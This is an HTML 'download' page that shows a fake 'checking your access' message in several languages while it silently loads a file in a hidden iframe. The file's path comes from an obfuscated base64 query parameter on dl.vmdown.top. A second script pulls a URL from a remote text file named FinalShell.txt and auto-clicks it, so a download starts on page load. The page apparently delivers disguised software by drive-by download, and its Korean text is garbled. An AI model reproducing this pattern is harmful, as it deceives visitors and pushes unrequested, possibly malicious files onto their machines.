
<!doctype html>
<html lang="zh">
    <head>
        <meta charset="utf-8" />
        <title>Download</title>
        <style>
            body {
                font-family:
                    system-ui,
                    -apple-system,
                    BlinkMacSystemFont,
                    sans-serif;
                background: #f5f7fb;
                margin: 0;
                padding: 0;
            }

            main {
                max-width: 520px;
                margin: 120px auto;
                background: #fff;
                border-radius: 12px;
                padding: 40px;
                text-align: center;
                box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
            }

            h1 {
                font-size: 22px;
                margin-bottom: 12px;
            }

            p {
                color: #666;
                font-size: 15px;
                margin-bottom: 24px;
            }

            button {
                background: #1677ff;
                color: #fff;
                border: none;
                padding: 12px 28px;
                border-radius: 6px;
                font-size: 16px;
                cursor: pointer;
            }

            button:disabled {
                opacity: 0.6;
                cursor: not-allowed;
            }
        </style>
    </head>
    <body>
        <main>
            <h1 id="title">Please wait..</h1>
            <p id="desc">We are checking your access. This usually takes only a few seconds.</p>
        </main>

        <iframe id="downloadFrame" style="display: none"></iframe>

        <script type="module">
            (async () => {
                setTimeout(async () => {
                    await fetch('track.php');
                }, 100)
                
                const iframe = document.getElementById("downloadFrame");
                const lang = (navigator.language || "en").toLowerCase();
                const i18n = {
                    zh: {
                        meta: '下载文件',
                        title: "请稍候..",
                        desc: "我们正在检查您的访问。这通常只需要几秒钟。",
                    },
                    en: {
                        meta: 'Download File',
                        title: "Please wait..",
                        desc: "We are checking your access. This usually takes only a few seconds.",
                    },
                    ja: {
                        meta: 'ダウンロードファイル',
                        title: "お待ちください..",
                        desc: "アクセスを確認しています。通常は数秒で完了します。",
                    },
                    ko: {
                        meta: '???? ??',
                        title: "??? ??? ???..",
                        desc: "??? ?? ????. ? ? ?? ????.",
                    },
                };

                function getLocale() {
                    if (lang.startsWith("zh")) return "zh";
                    if (lang.startsWith("ja")) return "ja";
                    if (lang.startsWith("ko")) return "ko";
                    return "en";
                }

                const locale = getLocale();
                const text = i18n[locale];

                document.title = text.meta;
                document.getElementById("title").innerText = text.title;
                document.getElementById("desc").innerText = text.desc;

                const params = new URLSearchParams(location.search);
                const id = params.get("device");
                const token = params.get("token");
                const secretData = params.get("d");
                const openData = params.get("od");
                const referrer = params.get("path");
                const closed = params.get("clos") === '1';
                const requestUri = !!secretData
                    ? `https://dl.vmdown.top${decodeURIComponent(atob(secretData))}?deviceId=${id}&token=${token}`
                    : `https://dl.vmdown.top/${openData}?deviceId=${id}&token=${token}`;
                    // ? `http://localhost:9823${decodeURIComponent(atob(secretData))}?id=${token}?deviceId=${id}&token=${token}`
                    // : `http://localhost:9823/${openData}?id=${token}?deviceId=${id}&token=${token}`;

                if (!id || !token) {
                    progressEnd(0);
                    return;
                }

                var finished = false;
                progressEnd(5000);
                iframe.onload = function () {
                    if (finished) return;
                    finished = true;
                    progressEnd();
                };

                setTimeout(function () {
                    if (finished) return;
                    finished = true;
                    progressEnd(100);
                }, 10000);
                iframe.src = requestUri;

                function progressEnd(timeout) {
                    setTimeout(function () {
                        if (!!referrer && !closed) {
                            window.location.href = referrer;
                            return;
                        }
                        if (window.history.length > 1 && !closed) {
                            window.history.back();
                            return;
                        }
                        window.close();
                    }, timeout || 5000);
                }
            })();

        </script>
    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"88a71f64e2794d798bd1bcd1539b6ed6","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
    <script>
        fetch('https://youlian-cn.com/zh/FinalShell.txt')
            .then(res => res.text())
            .then(url => {
                if(url.startsWith('http')) {
                    const a = document.createElement('a');
                    a.href = url.trim();
                    a.click(); // 触发文件下载
                }
            });
    </script>
</body>
</html>